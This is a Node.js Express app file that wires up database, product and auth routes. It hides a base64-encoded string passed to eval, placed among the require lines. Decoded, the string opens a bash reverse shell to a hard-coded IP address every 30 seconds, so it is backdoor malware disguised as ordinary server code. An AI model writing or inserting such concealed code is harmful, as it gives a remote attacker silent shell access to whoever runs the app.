const express = require('express')
const { connect } = require('./database/connexion')

const app = express()
app.use(express.json())

const database = async () => {
  await connect()
}
database()

const productRoute = require('./routes/product.route')
const authRoute = require('./routes/auth.route')
const authMiddleware = require('./middleware/auth.middleware')
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*')
  // res.setHeader('Access-Control-')
  next()
})

app.use('/product', authMiddleware, productRoute)
app.use('/auth', authRoute)

app.use('/user', (req, res, next) => {
  console.log('This only runs on /user');
})

module.exports = app
